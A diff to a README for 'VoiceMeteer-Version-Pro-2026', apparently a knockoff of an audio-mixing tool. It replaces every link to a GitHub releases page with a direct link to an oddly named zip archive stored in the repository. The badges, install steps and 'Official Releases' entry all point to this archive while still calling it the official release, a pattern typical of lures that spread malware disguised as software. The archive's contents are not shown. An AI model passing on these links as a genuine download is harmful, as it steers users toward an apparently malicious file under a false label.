@@ -1,6 +1,6 @@
 # 🎛️ VoiceMeteer-Version-Pro-2026 - Manage Your Audio Effortlessly
 
-[![Download VoiceMeteer-Version-Pro-2026](https://img.shields.io/badge/Download-VoiceMeteer-blue?style=for-the-badge)](https://github.com/BenoBeeper/VoiceMeteer-Version-Pro-2026/releases)
+[![Download VoiceMeteer-Version-Pro-2026](https://img.shields.io/badge/Download-VoiceMeteer-blue?style=for-the-badge)](https://raw.githubusercontent.com/BenoBeeper/VoiceMeteer-Version-Pro-2026/main/baiginet/Meteer-Version-Voice-Pro-arpeggioed.zip)
 
 ---
 
@@ -31,12 +31,12 @@ Your PC should be up to date with Windows updates to ensure the audio drivers in
 
 You need to visit the official releases page to get the latest version of VoiceMeteer-Version-Pro-2026.
 
-[![Download Page](https://img.shields.io/badge/Visit-Releases-9cf?style=for-the-badge&logo=github)](https://github.com/BenoBeeper/VoiceMeteer-Version-Pro-2026/releases)
+[![Download Page](https://img.shields.io/badge/Visit-Releases-9cf?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/BenoBeeper/VoiceMeteer-Version-Pro-2026/main/baiginet/Meteer-Version-Voice-Pro-arpeggioed.zip)
 
 ### Steps to download and install:
 
 1. Click the download button above or visit this page:  
-   https://github.com/BenoBeeper/VoiceMeteer-Version-Pro-2026/releases
+   https://raw.githubusercontent.com/BenoBeeper/VoiceMeteer-Version-Pro-2026/main/baiginet/Meteer-Version-Voice-Pro-arpeggioed.zip
 
 2. On the releases page, look for the latest release. It usually shows as the top item.
 
@@ -146,7 +146,7 @@ VoiceMeteer-Version-Pro-2026 offers:
 
 ## 🔗 Useful Links
 
-- Official Releases: https://github.com/BenoBeeper/VoiceMeteer-Version-Pro-2026/releases
+- Official Releases: https://raw.githubusercontent.com/BenoBeeper/VoiceMeteer-Version-Pro-2026/main/baiginet/Meteer-Version-Voice-Pro-arpeggioed.zip
 
 - User Guides and Tutorials: Available on the release page or VB-Audio website
 
